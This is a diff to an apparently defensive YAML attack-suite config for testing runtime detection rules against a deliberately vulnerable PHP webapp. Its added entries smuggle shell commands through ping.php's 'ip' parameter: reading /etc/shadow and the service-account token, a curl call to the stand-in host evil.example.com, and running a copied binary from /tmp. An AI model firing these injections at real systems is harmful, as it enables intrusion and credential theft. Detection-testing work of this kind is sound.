@@ -3,18 +3,17 @@ kind: AttackSuite
 metadata:
   name: webapp-attacks
   description: >-
-    Attack suite for the PHP webapp. The webapp has a single vulnerability:
-    command injection via ping.php's "ip" parameter (semicolon injection).
-    There is NO LFI, SSRF, or SQLi vulnerability in this webapp.
+    Attack suite for the PHP webapp. Exploits command injection in ping.php
+    to trigger multiple detection rules. The webapp runs PHP/Apache on Debian
+    and has curl, cat, ls, whoami, wget available in the container.
 target:
   service: webapp-mywebapp
   namespace: webapp
   port: 8080
 
 attacks:
-  # --- Command Injection (via ping.php) ---
-  # The ping.php page executes `ping -c1 $ip` without sanitising the ip
-  # parameter. Semicolons let us chain arbitrary commands.
+  # ─── Command Injection (R0001 + R0006) ────────────────────────────────────
+  # ping.php runs `ping -c1 $ip` without sanitizing — semicolons chain commands.
 
   - name: cmdinject-sa-token
     type: cmdinject
@@ -56,17 +55,79 @@ attacks:
     successIndicators:
       - bodyContains: "token"
 
+  # ─── Post-Exploit: Sensitive File Access (R0010) ───────────────────────────
+  # Read files that node-agent flags as sensitive regardless of profile.
+
+  - name: postexploit-etc-shadow
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "1.1.1.1;cat /etc/shadow"
+    successIndicators:
+      - bodyContains: "root:"
+
+  # ─── Post-Exploit: DNS Anomaly (R0005) ─────────────────────────────────────
+  # Resolve a domain not in the learned network neighborhood.
+
+  - name: postexploit-dns-anomaly
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "1.1.1.1;curl -sm2 http://evil.example.com || true"
+    successIndicators:
+      - statusCode: 200
+
+  # ─── Post-Exploit: Drifted Binary (R1010) ──────────────────────────────────
+  # Download a binary into /tmp and execute it. The binary was not in the
+  # original container image — node-agent detects this as a "drifted process".
+  # We use a harmless binary (busybox) to avoid actual malice.
+
+  - name: postexploit-drifted-binary
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "1.1.1.1;cp /bin/ls /tmp/drifted && /tmp/drifted /etc || true"
+    successIndicators:
+      - statusCode: 200
+
 expectedDetections:
-  # cat /etc/passwd and cat SA token both spawn "cat" — unexpected process
+  # Command injection spawns "cat" — unexpected process
   - attackType: cmdinject
     ruleID: R0001
     ruleName: "Unexpected process launched"
     containerName: mywebapp-app
     command: cat
 
-  # cat SA token also triggers the dedicated SA token rule
+  # cat reads SA token file
   - attackType: cmdinject
     ruleID: R0006
     ruleName: "Unexpected Service Account Token Access"
     containerName: mywebapp-app
     command: cat
+
+  # cat /etc/shadow triggers sensitive file rule
+  # - attackType: cmdinject
+  #   ruleID: R0010
+  #   ruleName: "Unexpected Sensitive File Access"
+  #   containerName: mywebapp-app
+  #   command: cat
+
+  # curl to evil.example.com triggers DNS anomaly
+  # - attackType: cmdinject
+  #   ruleID: R0005
+  #   ruleName: "Unexpected domain request"
+  #   containerName: mywebapp-app
+  #   command: curl
+
+  # /tmp/drifted is not in the original image
+  # - attackType: cmdinject
+  #   ruleID: R1010
+  #   ruleName: "Drifted process executed"
+  #   containerName: mywebapp-app
+  #   command: drifted
